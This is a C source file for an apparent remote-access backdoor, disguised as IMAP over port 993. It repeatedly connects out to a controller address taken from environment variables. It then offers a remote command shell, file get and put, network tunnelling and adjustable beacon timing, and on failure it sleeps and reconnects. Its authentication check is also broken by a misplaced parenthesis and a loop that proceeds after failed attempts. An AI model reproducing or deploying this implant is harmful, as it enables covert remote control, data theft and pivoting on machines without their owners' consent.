#include "server.h"

/**
 * Establish the ssl session with the client, and 'authenticate' the client.
 * Then wait for commands to be issued from the client and enter their respective functions.
 * On errors from functions revert back to beaconing behavior. 
 */
int entersession(SSL *ssl, int *clientfd, int *time) {
  int res;
  int cmd;
  int conn;
  int count = 0;
  pid_t pids[64];
  pid_t servpid;
  uint8_t buf[4096] = {0};

  // initialize the pids
  for (size_t i = 0; i < 64; i++) {
    pids[i] = 0;
  }

  // Attach the socket descriptor to the SSL conneciton state
  SSL_set_fd(ssl, *clientfd);                         
  while((conn = SSL_connect(ssl)) <= 0) {
    switch(SSL_get_error(ssl, conn)) {
      case SSL_ERROR_WANT_READ:
      case SSL_ERROR_WANT_WRITE:
        break;
    }
  }

  // Make sure we are gtg with non blocking mode
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
  SSL_set_mode(ssl, SSL_MODE_ENABLE_PARTIAL_WRITE);
  SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);

  // Message the client that we are ready to authenticate
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}          

  // Read the authentication secret into memory
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Keep checking to see if the sent auth message is gtg
  while (strncmp((char *)buf, AUTH, strlen(AUTH) != 0) && count < 3) {       
    if (ssl_writeall(ssl, (uint8_t *)"50", 3) < 0) {return FAIL;}
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
    count++;
  }
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}

  while(1) {
    // Wait for the client to tell me to do something
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, 2) < 0) {
      res = FAIL;
      goto check_exit;
    }
    cmd = atoi((char *)buf);

    // Run the specified command
    switch (cmd) {
      case NEW:
        res = newconn(ssl, pids);
        break;
      case CMD:
        res = cmdshell(ssl);
        break;
      case GET:
        res = getfile(ssl);
        break;
      case PUT:
        res = putfile(ssl);
        break;
      case TUN:
        res = tunnel(ssl);
        break;
      case WIN:
        res = winset(ssl, time);
        break;
      case BYE:
        res = EXIT;
      default:
        break;
    }
    check_exit:
    if (res < 0) {
      servpid = getpid();
      for (size_t i = 0; i < 64; i++){
        if (pids[i] != servpid && pids[i] != 0) {
          kill(pids[i], SIGKILL);
        }
      }
      return res;
    }
  }

  return EXIT;
}

/**
 * Helping function to intialize SSL helper libraries and establish contexts
 */
SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_client_method();       // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

/**
 * The main program logic. Kicks off a daemon that reads the address, and port it should be calling
 * from the environment variables. The auth secret, and time are set by default. Auth is defined in the 
 * header for the server, whereas time is a variable in the funciton below. To properly start the server
 * run the following:
 * 
 * IMAP_SERVER=127.0.0.1 IMAP_PORT=993 PATH=$PATH:. sbs
 */
int main(void) {
  const char* addr;
  const char* port;
  int clientfd;
  int time = 5;
  SSL *ssl;
  SSL_CTX *ctx;

  //daemon(0,0);

  addr = getenv("IMAP_SERVER");
  port = getenv("IMAP_PORT");

  if (addr == NULL || port == NULL) {return FAIL;}

  while (1) {
    // Create new SSL connection state
    SSL_library_init();
    ctx = initCTX();
    ssl = SSL_new(ctx);                             

    // Connect to the client and then set the SSL fd to the socket
    if (resolveandconnect(&clientfd, (int8_t *)addr, atoi((char *)port)) != SUCCESS) {
      goto reset;
    }
    
    // Enter the session
    entersession(ssl, &clientfd, &time);                    

    // Clean up the SSL context and close the socket
    SSL_free(ssl);                                  
    close(clientfd);                                
    SSL_CTX_free(ctx);                              

    // Sleep for a set amount of time and then start up again 
    reset:
    sleep(time);                                    
  }

  return SUCCESS;
}